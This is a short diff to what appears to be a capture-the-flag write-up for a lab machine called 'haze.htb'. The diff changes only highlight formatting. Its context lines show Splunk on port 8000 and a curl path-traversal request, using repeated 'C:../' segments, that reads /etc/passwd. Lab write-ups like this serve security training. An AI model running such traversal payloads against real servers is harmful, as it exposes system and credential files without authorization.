@@ -24,7 +24,7 @@ haze.htb**
 
 **4.** INFO: SPLUNK PORT 8000 opens in FIREFOX http://haze.htb:8000.
 
-NEXT: [Tried **http** and **https** on all SPLUNK PORTS]{.mark}
+NEXT: Tried **http** and **https** on all SPLUNK PORTS
 
 - <http://haze.htb:8000> opened a SPLUNK WEBSITE with LOGIN FIELD
 
@@ -54,7 +54,7 @@ attempting to read a sensitive system file.
 
 ![](images/media/image6.png)
 
-**[ALTERNATIVE:]{.mark}**
+**ALTERNATIVE:**
 
 **RUN:** **curl -s
 http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../etc/passwd**
